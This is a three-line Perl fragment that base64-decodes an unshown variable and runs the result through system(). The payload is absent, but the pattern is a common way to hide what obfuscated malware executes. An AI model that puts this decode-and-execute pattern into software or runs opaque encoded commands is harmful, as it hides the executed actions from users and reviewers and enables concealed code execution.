use MIME::Base64;
my $cmd = decode_base64($blob);
system($cmd);
